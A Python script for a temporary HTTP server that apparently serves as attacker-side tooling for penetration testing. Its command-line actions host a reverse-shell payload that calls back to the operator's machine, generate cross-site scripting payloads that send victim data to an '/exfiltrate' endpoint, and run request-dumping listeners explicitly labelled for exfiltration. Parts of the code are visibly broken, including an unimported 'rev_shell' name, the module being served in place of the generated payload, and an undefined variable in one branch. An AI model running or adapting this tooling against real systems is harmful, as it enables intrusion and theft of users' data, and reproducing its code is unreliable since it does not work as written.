#!/usr/bin/env python

import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import threading
import requests
import time
import os
import ssl
import util

class FileServerRequestHandler(BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_HEAD(self):
        self.do_GET()

    def do_POST(self):
        self.do_GET()

    def onForward(self, base_path, target, **kwargs):
        path = self.path[max(0, len(base_path)-1):]
        parts = urlparse(target)
        if path.startswith(parts.path):
            path = path[len(parts.path):]

        target_rewrite = target + path

        # queryStr = "" if "?" not in self.path else self.path[self.path.index("?")+1:]
        # if queryStr:
        #     target += "?" if "?" not in target else "&"
        #     target += queryStr

        content_length = self.headers.get('Content-Length')
        data = None

        if content_length and int(content_length) > 0:
            data = self.rfile.read(int(content_length))

        if "Host" in self.headers:
            del self.headers["Host"]

        method = self.command
        print(target, "=>", method, target_rewrite)
        res = requests.request(method, target_rewrite, headers=self.headers, data=data, **kwargs)
        return res.status_code, res.content, res.headers

    def read_body(self):
        if not hasattr(self, "body"):
            content_length = self.headers.get('Content-Length')
            if content_length and int(content_length) > 0:
                self.body = self.rfile.read(int(content_length))
            else:
                self.body = None

        return self.body

    def find_route(self, path):

        if path in self.server.routes:
            return self.server.routes[path]

        for p, route in self.server.prefix_routes.items():
            if path.startswith(p):
                return route

        def not_found(req):
            return 404, b"", {}

        return not_found

    def do_OPTIONS(self):
        self.do_GET()

    def do_GET(self):
        try:
            if not self.server.is_running:
                self.send_response(200)
                self.end_headers()
                return

            path = self.server.cleanPath(self.path)
            route = self.find_route(path)
            result = route(self)

            blacklist_headers = ["transfer-encoding", "content-length", "content-encoding", "allow", "connection"]
            if isinstance(result, tuple):
                status_code = 200 if len(result) < 1 else result[0]
                data        = b"" if len(result) < 2 else result[1]
                headers     = { } if len(result) < 3 else result[2]
            elif isinstance(result, int):
                status_code = result
                data = b""
                headers = {}
            elif result is None:
                status_code = 201
                data = b""
                headers = {}
            else:
                status_code = 200
                data = data if type(data) in [bytes, bytearray] else str(data).encode()
                headers = {}

            if path in self.server.dumpRequests:
                headers["Access-Control-Allow-Origin"] = "*"
            
            headers["Connection"] = "Close"
            headers["Content-Length"] = len(util.nvl(data, b""))

            if len(headers) == 0:
                self.send_response(status_code)
            else:
                if path != "/dummy":
                    self.log_request(status_code)
                self.send_response_only(status_code)

                for key, value in headers.items():
                    if key.lower() not in blacklist_headers:
                        self.send_header(key, value)

                if self.command.upper() == "OPTIONS":
                    self.send_header("Allow", "OPTIONS, GET, HEAD, POST")

            self.end_headers()

            if data and self.command.upper() not in ["HEAD","OPTIONS"]:
                if isinstance(data, str):
                    data = data.encode()
                self.wfile.write(data)

            if (path in self.server.dumpRequests or "/" in self.server.dumpRequests) and path != "/dummy":
                body = self.read_body()

                print("===== Connection from:",self.client_address[0])
                print("%s %s %s" % (self.command, self.path, self.request_version))
                print(str(self.headers).strip())
                if body:
                    print()
                    print(body)
                print("==========")
        except Exception as e:
            print("Exception on handling http", str(e))
            raise e

    def log_message(self, format, *args):
        if self.server.logRequests:
            super().log_message(format, *args)

class HttpFileServer(HTTPServer):
    def __init__(self, addr, port):
        super().__init__((addr, port), FileServerRequestHandler)
        self.logRequests = False
        self.routes = { }
        self.dumpRequests = []
        self.prefix_routes = { }
        self.is_running = True
        self.listen_thread = None

    def cleanPath(self, path):

        if "?" in path:
            path = path[0:path.find("?")]

        if not path.startswith("/"):
            path = "/" + path

        return path.strip()

    def addFile(self, name, data, mime_type=None):

        assert isinstance(name, str)
        assert data is not None

        if hasattr(data, "read"):
            fd = data
            data = data.read()
            fd.close()

        if isinstance(data, str):
            data = data.encode("UTF-8")
    
        headers = { 
            "Access-Control-Allow-Origin": "*"
        }
        
        if mime_type:
            headers["Content-Type"] = mime_type

        # return 200 - OK and data
        self.addRoute(name, lambda req: (200, data, headers))

    def add_file_path(self, path, name=None):
        def readfile():
            with open(path, "rb") as f:
                return f.read()

        if name is None:
            name = os.path.basename(path)
        self.addRoute(name, lambda req: (200, readfile()))

    def load_directory(self, path, recursive=True, exclude_ext=[]):
        if not os.path.isdir(path):
            print("Not a directory:", path)
            return

        for dp, dn, filenames in os.walk(path):
            for f in filenames:
                file_path = os.path.join(dp, f)
                if not exclude_ext or os.path.splitext(file_path)[1] not in exclude_ext:
                    relative_path = file_path[len(path):]
                    self.add_file_path(file_path, relative_path)

    def dumpRequest(self, name):
        self.dumpRequests.append(self.cleanPath(name))

    def addRoute(self, path, func):
        self.routes[self.cleanPath(path)] = func

    def addPrefixRoute(self, path, func):
        self.prefix_routes[self.cleanPath(path)] = func

    def forwardRequest(self, path, target, **kwargs):
        self.addPrefixRoute(path, lambda req: req.onForward(path, target, **kwargs))

    def enableLogging(self):
        self.logRequests = True

    def enableSSL(self, keyFile="private.key", certFile="server.crt"):

        if not os.path.isfile(keyFile):
            print("Generating private key and certificate…")
            os.system("openssl req -new -x509 -keyout private.key -out server.crt -days 365 -nodes")
        elif not os.path.isfile(certFile):
            print("Generating certificate…")
            os.system("openssl req -new -x509 -keyin private.key -out server.crt -days 365 -nodes")

        self.socket = ssl.wrap_socket(self.socket,
            server_side=True,
            certfile=certFile,
            keyfile=keyFile,
            ssl_version=ssl.PROTOCOL_TLS,
            cert_reqs=ssl.CERT_NONE)

        # try:
        #     ssl._create_default_https_context = ssl._create_unverified_context
        # except AttributeError:
        #     print("Legacy Python that doesn't verify HTTPS certificates by default")
        #     pass

    def startBackground(self):
        self.listen_thread = threading.Thread(target=self.serve_forever)
        self.listen_thread.start()
        return self.listen_thread

    def get_base_url(self, ip_addr=None):
        addr, port = self.server_address
    
        if ip_addr is not None:
            addr = ip_addr

        protocol = "https" if type(self.socket) == ssl.SSLSocket else "http"
        if (int(port) == 80 and protocol == "http") or (int(port) == 443 and protocol == "https"):
            port = ""
        else:
            port = f":{port}"
    
        return f"{protocol}://{addr}{port}"

    def get_full_url(self, uri, ip_addr=None):
        if not uri.startswith("/"):
            uri = "/" + uri
        return self.get_base_url(ip_addr) + uri

    def stop(self):
        self.is_running = False
        time.sleep(1)       
        self.shutdown()
        if self.listen_thread != threading.currentThread():
            self.listen_thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spawn a temporary http server")
    parser.add_argument(
        "action",
        choices=["shell", "dump", "proxy", "xss", "start"],
        help="Choose one of these actions: shell, dump, proxy, xss, start"
    )

    parser.add_argument(
        "--bind-address",
        type=str,
        default="0.0.0.0",
        dest="bind_addr",
        help="Address to bind on (default: 0.0.0.0)"
    )

    parser.add_argument(
        "--port",
        type=int,
        default=9000,
        help="Port to bind on (default: 9000)"
    )

    parser.add_argument(
        "--payload",
        type=str,
        default=None,
        help="Payload for xss / shell"
    )

    args = parser.parse_args()

    file_server = HttpFileServer(args.bind_addr, args.port)
    ip_address = util.get_address()

    if args.action == "shell":
        payload_type = args.payload if args.payload else "bash"
        shell_payload = rev_shell.generate_payload(args.payload, ip_address, 4444)
        file_server.addFile("/shell", rev_shell)
        print("Reverse Shell URL:", file_server.get_full_url("/shell", ip_address))
    elif args.action == "dump":
        file_server.dumpRequest("/")
        print("Exfiltrate data using:", file_server.get_full_url("/", ip_address))
    elif args.action == "proxy":
        url = "https://google.com"
        file_server.forwardRequest("/proxy", url)
        print("Exfiltrate data using:", file_server.get_full_url("/proxy", ip_address))
    elif args.action  == "xss":
        from xss_handler import generate_payload as generate_xss_payload
        payload_type = args.payload if args.payload else "img"
        xss = generate_xss_payload(payload_type, file_server.get_full_url("/exfiltrate", ip_address))
        file_server.addFile("/xss", xss)
        file_server.dumpRequest("/exfiltrate")
        print("Exfiltrate data using:")
        print(xss)
    elif args.action == "start":
        file_server.load_directory(".")
        print("Serve files in current directory using:")
        print(file_server.get_full_url("/", ip_addr=ip_address))

    file_server.serve_forever()
